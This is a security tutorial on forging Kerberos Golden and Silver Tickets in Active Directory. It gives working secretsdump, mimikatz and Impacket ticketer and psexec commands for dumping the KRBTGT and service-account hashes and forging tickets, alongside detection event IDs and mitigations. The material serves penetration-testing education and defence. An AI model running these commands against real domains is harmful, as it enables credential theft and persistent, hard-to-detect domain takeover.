# 🎫 Golden Ticket & Silver Ticket Attacks in Active Directory

Golden Ticket and Silver Ticket are **Kerberos-based persistence and privilege escalation attacks** in Active Directory. They allow an attacker to forge authentication tickets and maintain long-term access to the domain.

---

## 🧠 Quick Overview

| Feature | Golden Ticket | Silver Ticket |
| --- | --- | --- |
| What is forged | TGT (Ticket Granting Ticket) | TGS (Service Ticket) |
| Key used | KRBTGT account hash | Service account hash |
| Scope | Entire domain | Single service |
| Persistence | Very high | Medium |
| Detection difficulty | Hard | Harder |
| Requires DC compromise | Usually yes | No (just service acct hash) |

---

# 🥇 Golden Ticket Attack

## 🔐 What Is It?

A Golden Ticket is a **forged TGT** created using the **KRBTGT account's NTLM hash**.

> The KRBTGT account is used by the Key Distribution Center (KDC) to encrypt all TGTs. If an attacker has its hash, they can create TGTs for **any user**, including non-existent users, with **any privileges**.

---

## 🎯 What You Need

To create a Golden Ticket:

1. **KRBTGT NTLM hash** — obtained via DCSync or NTDS.dit dump
2. **Domain SID** — Security Identifier of the domain
3. **Domain name** — e.g., `corp.local`
4. **Username** — any (real or fake)

---

## 🛠 How to Get KRBTGT Hash

### Method 1: DCSync Attack (from Domain Admin)

```bash
secretsdump.py corp.local/administrator:Password@10.0.0.100 -just-dc-user krbtgt
```

### Method 2: NTDS.dit Extraction

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Method 3: Mimikatz on Domain Controller

```powershell
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

---

## 🔥 Creating a Golden Ticket

### Using Mimikatz

```powershell
kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:NTLM_HASH_HERE /id:500 /ptt
```

Parameters:

* `/user:` — any username (can be fake)
* `/domain:` — target domain
* `/sid:` — domain SID
* `/krbtgt:` — KRBTGT NTLM hash
* `/id:500` — RID 500 = Administrator
* `/ptt` — Pass the Ticket (inject immediately)

### Using Impacket — ticketer.py

```bash
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local FakeAdmin
```

Then use the ticket:

```bash
export KRB5CCNAME=FakeAdmin.ccache
psexec.py corp.local/FakeAdmin@dc01.corp.local -k -no-pass
```

---

## 🧨 Golden Ticket Attack Scenario

1. Attacker compromises Domain Admin account.
2. Runs DCSync to extract KRBTGT hash.
3. Creates Golden Ticket for a non-existent user: `SuperAdmin`.
4. Uses ticket to access **any resource** in the domain.
5. Even if all passwords are reset → Golden Ticket **still works**.
6. Only resetting KRBTGT password (twice!) invalidates it.

### Why It's Devastating

* Survives password resets
* Works for 10 years (default TGT lifetime)
* Can impersonate any user
* Very hard to detect

---

# 🥈 Silver Ticket Attack

## 🔐 What Is It?

A Silver Ticket is a **forged TGS (service ticket)** created using a **service account's NTLM hash**.

> Unlike Golden Tickets, Silver Tickets are scoped to a single service and never touch the Domain Controller — making detection even harder.

---

## 🎯 What You Need

1. **Service account NTLM hash** — from credential dump
2. **Domain SID**
3. **SPN** — Service Principal Name of the target service
4. **Domain name**

---

## 🔥 Creating a Silver Ticket

### Using Mimikatz

For CIFS (file share access):

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /target:fileserver.corp.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt
```

For HTTP (web service):

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /target:webserver.corp.local /service:http /rc4:SERVICE_NTLM_HASH /ptt
```

### Using Impacket

```bash
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local -spn cifs/fileserver.corp.local Administrator
```

---

## 🧨 Silver Ticket Scenario

1. Attacker Kerberoasts `sqlsvc` account → cracks password.
2. Computes NTLM hash of cracked password.
3. Creates Silver Ticket for `MSSQLSvc` on SQL server.
4. Accesses SQL server as any user.
5. DC never sees the forged ticket → no logs on DC.

---

## 📊 Common Silver Ticket Service Targets

| Service | SPN Type | What You Access |
| --- | --- | --- |
| CIFS | cifs/hostname | File shares (SMB) |
| HTTP | http/hostname | Web applications |
| MSSQL | MSSQLSvc/hostname | SQL databases |
| LDAP | ldap/hostname | Directory queries |
| HOST | host/hostname | WMI, scheduled tasks |
| WSMAN | wsman/hostname | PowerShell remoting |

---

## 🛡 Detection & Mitigation

### 🔎 Detection

#### Golden Ticket

* **Event ID 4769** — TGS request with unusual encryption
* **Event ID 4624** — Logon with non-existent user
* TGT with abnormally long lifetime
* Logon events without corresponding AS-REQ (Event ID 4768)

#### Silver Ticket

* **No DC logs** — this is the problem
* Monitor service access at the target server level
* Look for PAC validation failures
* Abnormal service access patterns

---

### 🔐 Mitigation

✅ **Reset KRBTGT password twice** — invalidates all Golden Tickets
✅ Rotate KRBTGT password regularly (every 180 days minimum)
✅ Use **AES keys** instead of RC4
✅ Enable **PAC validation** on services
✅ Implement **Credential Guard** on endpoints
✅ Monitor for DCSync attempts
✅ Use **Privileged Access Workstations (PAW)**
✅ Limit Domain Admin usage

---

## 🧠 Attack Flow Summary

### Golden Ticket Flow

```text
Compromise DA → DCSync KRBTGT hash → Forge TGT → Access anything → Persist
```

### Silver Ticket Flow

```text
Compromise service account hash → Forge TGS → Access specific service → No DC logs
```

---

## ⚠ Ethical Reminder

Everything discussed:

* Legal only in authorized labs
* Legal with written penetration testing authorization
* Illegal otherwise

---

## 📚 What to Learn Next

* 🔄 DCSync attack in detail
* 🧱 Credential Guard & how it blocks these attacks
* 🏗 Building an AD lab for practicing
* 🛡 Blue team KRBTGT monitoring
